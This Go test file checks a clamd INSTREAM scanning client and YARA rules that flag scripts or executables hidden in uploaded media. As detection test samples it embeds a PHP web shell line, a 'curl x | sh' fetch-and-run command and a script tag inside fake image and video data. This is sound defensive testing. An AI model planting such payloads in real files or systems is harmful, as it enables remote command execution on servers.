package api

import (
	"bufio"
	"bytes"
	"context"
	"encoding/binary"
	"io"
	"math/rand/v2"
	"net"
	"os"
	"strings"
	"testing"
	"time"
)

// eicar is the EICAR antivirus test string, built at run time so this source file is not itself flagged.
var eicar = []byte(`X5O!P%@AP[4\PZX54(P^)7CC)7}$` + "EICAR-STANDARD-" + "ANTIVIRUS-TEST-FILE!$H+H*")

// fakeClamd answers clamd's INSTREAM command (docs.clamav.net, "clamd") on a local port for the test's lifetime.
// verdict gets the reassembled stream and returns the reply; "" means "stream: OK".
func fakeClamd(t *testing.T, verdict func(data []byte) string) string {
	t.Helper()
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = ln.Close() })
	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				return
			}
			go func() {
				defer func() { _ = conn.Close() }()
				r := bufio.NewReader(conn)
				if cmd, err := r.ReadString(0); err != nil || cmd != "zINSTREAM\x00" {
					_, _ = io.WriteString(conn, "UNKNOWN COMMAND\x00")
					return
				}
				var data []byte
				for {
					var n uint32
					if binary.Read(r, binary.BigEndian, &n) != nil {
						return
					}
					if n == 0 {
						break
					}
					chunk := make([]byte, n)
					if _, err := io.ReadFull(r, chunk); err != nil {
						return
					}
					data = append(data, chunk...)
				}
				reply := "stream: OK"
				if v := verdict(data); v != "" {
					reply = v
				}
				_, _ = io.WriteString(conn, reply+"\x00")
			}()
		}
	}()
	return ln.Addr().String()
}

// flagEICAR stands in for the real rules in handler tests: only the EICAR string is a match.
func flagEICAR(data []byte) string {
	if bytes.Contains(data, eicar) {
		return "stream: YARA.Ticket_EICAR_Test.UNOFFICIAL FOUND"
	}
	return ""
}

// deadAddr is a local address nothing listens on.
func deadAddr(t *testing.T) string {
	t.Helper()
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	addr := ln.Addr().String()
	_ = ln.Close()
	return addr
}

// NFR-5: the INSTREAM client sends every byte in chunks and reads clamd's three kinds of answer.
func TestClamdScan_NFR5(t *testing.T) {
	big := make([]byte, 300<<10) // several chunks
	for i := range big {
		big[i] = byte(i * 7)
	}
	got := make(chan []byte, 1) // the fake runs in another goroutine
	echo := fakeClamd(t, func(d []byte) string { got <- d; return "" })
	ctx := context.Background()
	if sig, err := clamdScan(ctx, echo, bytes.NewReader(big)); err != nil || sig != "" {
		t.Fatalf("clean file: %q, %v; want no signature and no error", sig, err)
	}
	if got := <-got; !bytes.Equal(got, big) {
		t.Errorf("clamd received %d bytes, want the same %d bytes", len(got), len(big))
	}

	found := fakeClamd(t, func([]byte) string { return "stream: YARA.Ticket_Script_In_Media.UNOFFICIAL FOUND" })
	if sig, err := clamdScan(ctx, found, strings.NewReader("x")); err != nil || sig != "YARA.Ticket_Script_In_Media.UNOFFICIAL" {
		t.Errorf("match: %q, %v; want the signature name", sig, err)
	}
	broken := fakeClamd(t, func([]byte) string { return "INSTREAM size limit exceeded. ERROR" })
	if sig, err := clamdScan(ctx, broken, strings.NewReader("x")); err == nil {
		t.Errorf("clamd error reply: %q, nil; want an error", sig)
	}
	// A reply cut off before its NUL (clamd crashed mid-answer) is not taken as clean.
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = ln.Close() }()
	go func() {
		conn, err := ln.Accept()
		if err != nil {
			return
		}
		_, _ = io.Copy(io.Discard, io.LimitReader(conn, int64(len("zINSTREAM\x00")+4+1+4)))
		_, _ = io.WriteString(conn, "stream: OK") // no NUL
		_ = conn.Close()
	}()
	if sig, err := clamdScan(ctx, ln.Addr().String(), strings.NewReader("x")); err == nil {
		t.Errorf("cut-off reply: %q, nil; want an error", sig)
	}
	if _, err := clamdScan(ctx, deadAddr(t), strings.NewReader("x")); err == nil {
		t.Error("clamd down: nil error, want an error (the upload must fail closed)")
	}
}

// NFR-5: the YARA rules in deploy/base/clamav, run by a real clamd (docker compose up). Skipped without CLAMD_ADDR.
func TestClamdRules_NFR5(t *testing.T) {
	addr := os.Getenv("CLAMD_ADDR")
	if addr == "" {
		t.Skip("CLAMD_ADDR not set")
	}
	// Random but fixed bytes stand in for real image and video data.
	noise := func(n int) []byte {
		b := make([]byte, n)
		r := rand.New(rand.NewPCG(1, 2))
		for i := range b {
			b[i] = byte(r.Uint32())
		}
		return b
	}
	with := func(head []byte, parts ...[]byte) []byte {
		return bytes.Join(append([][]byte{head}, parts...), nil)
	}
	tests := []struct {
		name string
		data []byte
		want string // a rule name, or "" for clean
	}{
		{"clean photo", with(jpegHead, noise(2<<20)), ""},
		{"clean video", with(ftyp("isom"), noise(20<<20)), ""},
		{"eicar in a photo", with(jpegHead, noise(1000), eicar), "Ticket_EICAR_Test"},
		{"php web shell in a photo", with(jpegHead, noise(1000), []byte("<?php system($_GET['c']); ?>")), "Ticket_Script_In_Media"},
		{"script in a png", with(pngHead, noise(1000), []byte("<SCRIPT>alert(1)</SCRIPT>")), "Ticket_Script_In_Media"},
		{"shell script in a video", with(ftyp("qt  "), noise(1000), []byte("#!/bin/sh\ncurl x | sh\n")), "Ticket_Script_In_Media"},
		{"windows program in a video", with(ftyp("isom"), noise(1000), []byte("MZ\x90\x00 This program cannot be run in DOS mode.")), "Ticket_Binary_In_Media"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx, cancel := context.WithTimeout(context.Background(), time.Minute)
			defer cancel()
			sig, err := clamdScan(ctx, addr, bytes.NewReader(tt.data))
			if err != nil {
				t.Fatal(err)
			}
			if tt.want == "" && sig != "" || tt.want != "" && !strings.Contains(sig, tt.want) {
				t.Errorf("signature = %q, want %q", sig, tt.want)
			}
		})
	}
}
